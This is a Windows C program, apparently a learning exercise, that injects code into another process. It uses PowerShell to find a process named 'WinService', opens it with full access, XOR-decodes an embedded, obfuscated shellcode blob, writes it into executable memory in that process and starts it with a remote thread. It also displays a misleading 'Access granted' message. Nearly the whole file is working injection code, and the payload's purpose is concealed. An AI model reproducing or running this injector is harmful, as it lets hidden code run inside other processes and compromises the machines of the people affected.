 #include <windows.h>
#include <stdio.h>

const char * k = "[+]";
const char * e = "[-]";
const char * i = "[*]";

int main()
{
    LPSTR command = "powershell -Command Get-Process | ?{$_.Name -eq 'WinService'} | Select-Object -ExpandProperty Id";
    //Need to write output from this to buffer


    //Form a pipe for IPC communication.
    //Will grab the output from the PowerShell process and pass it to the C process via a buffer

    MessageBoxW(
        	NULL,
        	L"SUCCESS", //Message displayed
        	L"COMPLETED: Access granted", //Message header
        	MB_ICONINFORMATION //Specifies we want an error message with just an OK option
   	 	);

    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL; 

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        printf("CreatePipe failed (%d).\n", GetLastError());
        return 1;
    }

    // Create process information struct
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); //zeros it out to know state
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    si.hStdOutput = hPipeWrite; //Setting process output in struct to be pipe write handle
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Start the child process
    if (!CreateProcess(NULL,   // No module name (use command line)
                       command, // Command line
                       NULL,    // Process handle not inheritable
                       NULL,    // Thread handle not inheritable
                       TRUE,   // Need to have handle for output here so I can reference 
                       0,       // No creation flags
                       NULL,    // Use parent's environment block
                       NULL,    // Use parent's starting directory
                       &si,     // Pointer to STARTUPINFO structure
                       &pi))    // Pointer to PROCESS_INFORMATION structure
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }

    // Wait until child process exits
    //WaitForSingleObject(pi.hProcess, INFINITE); Only need this line if wanting the PowerShell process directly
    
    //Once we have the child process output
    CloseHandle(hPipeWrite);

    CHAR buffer[4096];
    DWORD bytesRead;
    if (!ReadFile(hPipeRead, buffer, sizeof(buffer), &bytesRead, NULL)) {
        printf("ReadFile failed (%d).\n", GetLastError());
        return 1;
    }
    CloseHandle(hPipeRead);

    // Null-terminate the buffer to print it as a string
    buffer[bytesRead] = '\0';

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    //Output our information
    PVOID rBuffer = NULL;
    DWORD dwPID = NULL, dwTID = NULL;
    HANDLE hProcess = NULL, hThread = NULL; 

    dwPID = atoi(buffer);
    //printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); //Privs and PID of proocess we want handle to 
    if(hProcess == NULL)
    {
        printf("failed to get process handle, error: 0x%1x", GetLastError()); //GetLastError is from Microsoft. Value is the calling threads last error code.
        return EXIT_FAILURE;
    }

unsigned char test[] = 
"\xb7\x03\xc8\xaf\xbb\xa3\x8b\x4b\x4b\x4b\x0a\x1a\x0a\x1b"
"\x19\x1a\x1d\x03\x7a\x99\x2e\x03\xc0\x19\x2b\x03\xc0\x19"
"\x53\x03\xc0\x19\x6b\x03\xc0\x39\x1b\x03\x44\xfc\x01\x01"
"\x06\x7a\x82\x03\x7a\x8b\xe7\x77\x2a\x37\x49\x67\x6b\x0a"
"\x8a\x82\x46\x0a\x4a\x8a\xa9\xa6\x19\x0a\x1a\x03\xc0\x19"
"\x6b\xc0\x09\x77\x03\x4a\x9b\xc0\xcb\xc3\x4b\x4b\x4b\x03"
"\xce\x8b\x3f\x2c\x03\x4a\x9b\x1b\xc0\x03\x53\x0f\xc0\x0b"
"\x6b\x02\x4a\x9b\xa8\x1d\x03\xb4\x82\x0a\xc0\x7f\xc3\x03"
"\x4a\x9d\x06\x7a\x82\x03\x7a\x8b\xe7\x0a\x8a\x82\x46\x0a"
"\x4a\x8a\x73\xab\x3e\xba\x07\x48\x07\x6f\x43\x0e\x72\x9a"
"\x3e\x93\x13\x0f\xc0\x0b\x6f\x02\x4a\x9b\x2d\x0a\xc0\x47"
"\x03\x0f\xc0\x0b\x57\x02\x4a\x9b\x0a\xc0\x4f\xc3\x03\x4a"
"\x9b\x0a\x13\x0a\x13\x15\x12\x11\x0a\x13\x0a\x12\x0a\x11"
"\x03\xc8\xa7\x6b\x0a\x19\xb4\xab\x13\x0a\x12\x11\x03\xc0"
"\x59\xa2\x1c\xb4\xb4\xb4\x16\x02\xf5\x3c\x38\x79\x14\x78"
"\x79\x4b\x4b\x0a\x1d\x02\xc2\xad\x03\xca\xa7\xeb\x4a\x4b"
"\x4b\x02\xc2\xae\x02\xf7\x49\x4b\x4e\x72\xf5\x2f\x77\x82"
"\x0a\x1f\x02\xc2\xaf\x07\xc2\xba\x0a\xf1\x07\x3c\x6d\x4c"
"\xb4\x9e\x07\xc2\xa1\x23\x4a\x4a\x4b\x4b\x12\x0a\xf1\x62"
"\xcb\x20\x4b\xb4\x9e\x1b\x1b\x06\x7a\x82\x06\x7a\x8b\x03"
"\xb4\x8b\x03\xc2\x89\x03\xb4\x8b\x03\xc2\x8a\x0a\xf1\xa1"
"\x44\x94\xab\xb4\x9e\x03\xc2\x8c\x21\x5b\x0a\x13\x07\xc2"
"\xa9\x03\xc2\xb2\x0a\xf1\xd2\xee\x3f\x2a\xb4\x9e\x03\xca"
"\x8f\x0b\x49\x4b\x4b\x02\xf3\x28\x26\x2f\x4b\x4b\x4b\x4b"
"\x4b\x0a\x1b\x0a\x1b\x03\xc2\xa9\x1c\x1c\x1c\x06\x7a\x8b"
"\x21\x46\x12\x0a\x1b\xa9\xb7\x2d\x8c\x0f\x6f\x1f\x4a\x4a"
"\x03\xc6\x0f\x6f\x53\x8d\x4b\x23\x03\xc2\xad\x1d\x1b\x0a"
"\x1b\x0a\x1b\x0a\x1b\x02\xb4\x8b\x0a\x1b\x02\xb4\x83\x06"
"\xc2\x8a\x07\xc2\x8a\x0a\xf1\x32\x87\x74\xcd\xb4\x9e\x03"
"\x7a\x99\x03\xb4\x81\xc0\x45\x0a\xf1\x43\xcc\x56\x2b\xb4"
"\x9e\xf0\xbb\xfe\xe9\x1d\x0a\xf1\xed\xde\xf6\xd6\xb4\x9e"
"\x03\xc8\x8f\x63\x77\x4d\x37\x41\xcb\xb0\xab\x3e\x4e\xf0"
"\x0c\x58\x39\x24\x21\x4b\x12\x0a\xc2\x91\xb4\x9e\x4b";

    
    
    char key = 'K';
    int i = 0;
    for (i; i<sizeof(test) - 2; i++) //Need to remove the last element becasue of null terminator
    {
        test[i] = test[i]^key;
        //printf("\\x%02x",test[i]);
    }

    size_t testSize = sizeof(test);

    //Create a space for our process to exist in 
    rBuffer = VirtualAllocEx(hProcess, NULL, testSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // (MEM_RESERVE | MEM_COMMIT) allows you to do both
    //Making permission rw first then once it is established (made), use virtualprotect() to make it read write execute

    

    //Use documenation to do this with virtual protect
    //Memory protection constants can also be written in hex

    //Virtual protect is use in field a lot.

    if(rBuffer == NULL)
    {
        printf("%s failed to get allocate buffer, error: 0x%1x", k, GetLastError());
        return EXIT_FAILURE;
    }


    //Make our process happen
    WriteProcessMemory(hProcess, rBuffer, test, testSize, NULL);
    printf("%s wrote shellcode to the buffer\n", k); //Now I need to have a thread that envokes the information in that buffer

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer, 
        NULL,
        0,
        0,
        &dwTID);
    
    if(hThread == NULL)
    {
        printf("Failed to get handle");
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s waiting for thread to finish\n", k);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing\n", k);

    return EXIT_SUCCESS;
}
